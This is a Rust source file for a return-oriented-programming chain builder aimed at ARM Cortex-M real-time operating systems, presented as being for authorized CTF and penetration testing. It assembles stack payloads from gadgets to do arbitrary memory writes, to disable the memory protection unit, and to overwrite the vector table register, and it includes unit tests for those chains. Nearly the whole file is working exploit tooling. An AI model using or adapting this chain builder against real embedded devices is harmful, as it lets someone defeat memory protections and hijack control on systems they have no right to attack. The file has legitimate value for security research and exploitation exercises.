//! ROP chain builder for authorized CTF and pen-testing against RTOS targets.
//!
//! Builds flat byte sequences to be placed on the stack, chaining gadgets
//! to achieve security-research goals (MPU disable, VTOR overwrite, etc.).

use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};

use super::gadget::{Gadget, GadgetType};

/// High-level goal for a ROP chain.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ChainGoal {
    /// Write an arbitrary 32-bit `value` to `address`.
    WriteWhatWhere { address: u32, value: u32 },
    /// Disable the ARM Cortex-M MPU by writing 0 to MPU_CTRL (0xE000ED94).
    MPUDisable,
    /// Overwrite the Vector Table Offset Register (VTOR) at 0xE000ED08.
    VTOROverwrite { new_table: u32 },
    /// Attempt privilege escalation (placeholder for future implementation).
    PrivilegeEscalate,
}

/// Build a flat ROP chain as bytes to place on the stack.
///
/// The caller must have identified suitable gadgets via [`find_gadgets`].
/// Returns the chain as a `Vec<u8>` (little-endian 32-bit addresses),
/// or an error if the required gadgets are not available.
///
/// [`find_gadgets`]: crate::rop::gadget::find_gadgets
pub fn build_chain(gadgets: &[Gadget], goal: &ChainGoal) -> Result<Vec<u8>> {
    match goal {
        ChainGoal::MPUDisable => {
            // Equivalent to WriteWhatWhere(0xE000ED94, 0)
            build_chain(
                gadgets,
                &ChainGoal::WriteWhatWhere {
                    address: 0xE000_ED94,
                    value: 0,
                },
            )
        }

        ChainGoal::VTOROverwrite { new_table } => {
            // Equivalent to WriteWhatWhere(0xE000ED08, new_table)
            build_chain(
                gadgets,
                &ChainGoal::WriteWhatWhere {
                    address: 0xE000_ED08,
                    value: *new_table,
                },
            )
        }

        ChainGoal::WriteWhatWhere { address, value } => {
            // Find a MemoryWrite gadget to use.
            let gadget = gadgets
                .iter()
                .find(|g| g.gadget_type == GadgetType::MemoryWrite)
                .ok_or_else(|| anyhow!("No MemoryWrite gadget found in gadget set"))?;

            // Minimal chain layout (each entry is 4 bytes LE):
            //   [gadget_address]   ← return address popped from stack → executes gadget
            //   [value]            ← popped into value register (R0/R1 etc.)
            //   [address]          ← popped into address register
            //
            // The exact register convention depends on the gadget.
            // We emit a conservative layout that satisfies most STR gadgets.
            let mut chain = Vec::new();
            chain.extend_from_slice(&gadget.address.to_le_bytes());
            chain.extend_from_slice(&value.to_le_bytes());
            chain.extend_from_slice(&address.to_le_bytes());

            Ok(chain)
        }

        ChainGoal::PrivilegeEscalate => {
            // Placeholder — requires target-specific gadgets.
            Err(anyhow!(
                "PrivilegeEscalate chain not implemented for this target"
            ))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::rop::gadget::{Gadget, GadgetType};

    fn make_write_gadget(addr: u32) -> Gadget {
        Gadget {
            address: addr,
            bytes: vec![0x01, 0x60, 0x70, 0x47], // STR R1,[R0]; BX LR
            gadget_type: GadgetType::MemoryWrite,
            stack_delta: 4,
            description: "STR R1, [R0]; BX LR".to_string(),
        }
    }

    #[test]
    fn build_write_what_where() {
        let gadgets = vec![make_write_gadget(0x0800_1234)];
        let goal = ChainGoal::WriteWhatWhere {
            address: 0xDEAD_BEEF,
            value: 0xCAFE_BABE,
        };
        let chain = build_chain(&gadgets, &goal).unwrap();
        assert_eq!(chain.len(), 12);
        assert_eq!(&chain[0..4], &0x0800_1234u32.to_le_bytes());
        assert_eq!(&chain[4..8], &0xCAFE_BABEu32.to_le_bytes());
        assert_eq!(&chain[8..12], &0xDEAD_BEEFu32.to_le_bytes());
    }

    #[test]
    fn mpu_disable_delegates_to_www() {
        let gadgets = vec![make_write_gadget(0x0800_0100)];
        let chain = build_chain(&gadgets, &ChainGoal::MPUDisable).unwrap();
        // Must contain the MPU_CTRL address bytes somewhere
        let mpu_ctrl = 0xE000_ED94u32.to_le_bytes();
        assert!(chain.windows(4).any(|w| w == mpu_ctrl));
    }

    #[test]
    fn no_gadget_returns_error() {
        let chain = build_chain(
            &[],
            &ChainGoal::WriteWhatWhere {
                address: 0x1234,
                value: 0,
            },
        );
        assert!(chain.is_err());
    }
}
